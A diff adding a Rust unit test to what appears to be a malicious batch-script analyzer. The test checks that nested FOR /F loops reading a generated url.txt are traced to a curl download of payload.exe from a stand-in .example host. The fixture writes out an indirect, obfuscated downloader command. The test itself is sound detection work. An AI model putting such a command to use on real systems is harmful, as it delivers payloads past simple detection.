@@ -3745,6 +3745,28 @@ for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o
     }
 
     #[test]
+    fn for_f_dir_b_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-dir-b.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b url.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b source did not discover generated file for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_cmd_c_type_reads_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
